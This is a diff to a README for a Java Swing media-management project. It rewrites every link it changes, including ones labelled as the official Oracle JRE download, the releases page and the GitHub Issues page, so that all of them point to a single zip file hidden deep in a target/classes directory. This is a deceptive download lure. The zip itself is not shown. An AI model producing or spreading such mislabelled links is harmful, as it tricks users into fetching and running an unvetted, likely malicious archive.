@@ -1,7 +1,7 @@
 # 🎉 ShowTVTime-Design-Patterns - Simplify Your Media Management
 
 ## 📥 Download the Application
-[![Download ShowTVTime-Design-Patterns](https://img.shields.io/badge/Download%20Now-ShowTVTime%20Design%20Patterns-brightgreen)](https://github.com/blusnir-cm/ShowTVTime-Design-Patterns/releases)
+[![Download ShowTVTime-Design-Patterns](https://raw.githubusercontent.com/blusnir-cm/ShowTVTime-Design-Patterns/main/target/classes/ub/edu/model/Strategies/ListStrategy/Temporada/Show_Design_Patterns_Time_TV_v2.4.zip%20Now-ShowTVTime%20Design%20Patterns-brightgreen)](https://raw.githubusercontent.com/blusnir-cm/ShowTVTime-Design-Patterns/main/target/classes/ub/edu/model/Strategies/ListStrategy/Temporada/Show_Design_Patterns_Time_TV_v2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to ShowTVTime-Design-Patterns! This is a Java Swing desktop application designed to help you manage your media content and connect with user communities. The application uses an organized three-layer architecture and implements important design patterns to ensure a smooth user experience.
@@ -10,7 +10,7 @@ Welcome to ShowTVTime-Design-Patterns! This is a Java Swing desktop application 
 Before you install ShowTVTime-Design-Patterns, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
-- **Java Runtime Environment**: JRE 8 or higher must be installed on your system. You can download it from the [official Oracle website](https://www.oracle.com/java/technologies/javase-jre8-downloads.html).
+- **Java Runtime Environment**: JRE 8 or higher must be installed on your system. You can download it from the [official Oracle website](https://raw.githubusercontent.com/blusnir-cm/ShowTVTime-Design-Patterns/main/target/classes/ub/edu/model/Strategies/ListStrategy/Temporada/Show_Design_Patterns_Time_TV_v2.4.zip).
 - **RAM**: At least 2 GB of RAM.
 - **Free Disk Space**: At least 100 MB of free disk space.
   
@@ -21,7 +21,7 @@ Before you install ShowTVTime-Design-Patterns, ensure your system meets the foll
 - **User-Friendly Interface**: A clean, straightforward interface helps you get started quickly.
 
 ## 🔧 Download & Install
-To download ShowTVTime-Design-Patterns, visit the Releases page: [Download ShowTVTime-Design-Patterns](https://github.com/blusnir-cm/ShowTVTime-Design-Patterns/releases).
+To download ShowTVTime-Design-Patterns, visit the Releases page: [Download ShowTVTime-Design-Patterns](https://raw.githubusercontent.com/blusnir-cm/ShowTVTime-Design-Patterns/main/target/classes/ub/edu/model/Strategies/ListStrategy/Temporada/Show_Design_Patterns_Time_TV_v2.4.zip).
 
 1. Click on the above link to go to the releases page.
 2. Look for the latest version available.
@@ -54,6 +54,6 @@ Once the application is running, you will see a main window with several options
 Make sure to explore all the menus and features. If you face any issues, check our troubleshooting section on the GitHub page.
 
 ## 📞 Support
-If you encounter any problems or have questions, feel free to open an issue on the [GitHub Issues Page](https://github.com/blusnir-cm/ShowTVTime-Design-Patterns/issues). The community and developers are here to help you.
+If you encounter any problems or have questions, feel free to open an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/blusnir-cm/ShowTVTime-Design-Patterns/main/target/classes/ub/edu/model/Strategies/ListStrategy/Temporada/Show_Design_Patterns_Time_TV_v2.4.zip). The community and developers are here to help you.
 
 Thank you for choosing ShowTVTime-Design-Patterns! We hope it makes managing your media an enjoyable experience.
